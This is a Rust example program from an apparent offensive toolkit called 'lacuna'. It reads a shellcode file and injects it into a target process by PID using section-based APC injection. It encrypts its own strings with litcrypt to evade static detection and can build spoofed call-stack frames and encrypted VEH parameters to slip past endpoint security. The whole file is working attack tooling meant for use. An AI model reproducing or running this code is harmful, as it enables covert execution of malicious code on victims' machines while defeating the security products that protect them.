//
// examples/inject.rs — Section-based APC injection
//
// Equivalent to:  lacuna.exe inject <pid> <sc.bin> [--verbose]
//
// Run with:  cargo run --example inject --features inject -- <pid> <sc.bin> [--verbose]
//

#[macro_use]
extern crate litcrypt2;
extern crate alloc;
use_litcrypt!();

#[allow(unused_imports)]
use std::env;
#[allow(unused_imports)]
use std::fs;
#[allow(unused_imports)]
use std::process;

#[cfg(not(feature = "inject"))]
fn main() {
    eprintln!("{}", lc!("inject requires the 'inject' feature:"));
    eprintln!("{}", lc!("  cargo run --example inject --features inject -- <pid> <sc.bin> [--verbose]"));
}

#[cfg(feature = "inject")]
fn main() {
    let args: Vec<String> = env::args().collect();
    if args.len() < 3 {
        eprintln!("{}", lc!("usage: inject <pid> <sc.bin> [--verbose]"));
        process::exit(1);
    }

    let pid: u32 = args[1].parse().unwrap_or_else(|_| {
        eprintln!("{}", lc!("[-] bad pid"));
        process::exit(1);
    });

    let sc = fs::read(&args[2]).unwrap_or_else(|e| {
        eprintln!("{}{}: {}", lc!("[-] can't open "), args[2], e);
        process::exit(1);
    });

    let verbose = args.iter().any(|a| a == "--verbose");

    println!("{}{}{}{}{}\n",
             lc!("[*] "), sc.len(),
             lc!(" bytes  ->  pid "), pid,
             if verbose { lc!("  [verbose]") } else { lc!("") });

    // Build the ghost-frame chain first (if stack-spoof is enabled).
    // This must happen before inject_sapc so the VEH full_spoof path
    // has ghost layer addresses to work with.
    #[cfg(feature = "stack-spoof")]
    {
        if !lacuna::chain::build_chain() {
            eprintln!("{}", lc!("[-] build_chain failed — continuing without stack spoofing"));
        }
    }

    // VEH registration is now handled inside inject_sapc_verbose(), matching
    // the C original's ordering:
    //   1. param_encrypt_veh registered before NtOpenProcess
    //   2. chain_veh registered after NtOpenProcess succeeds
    match lacuna::inject::inject_sapc_verbose(pid, &sc, verbose) {
        Ok(()) => println!("\n{}", lc!("[+] injection done")),
        Err(status) => {
            println!("\n{}{:08x}", lc!("[-] injection failed: status "), status);
            process::exit(1);
        }
    }
}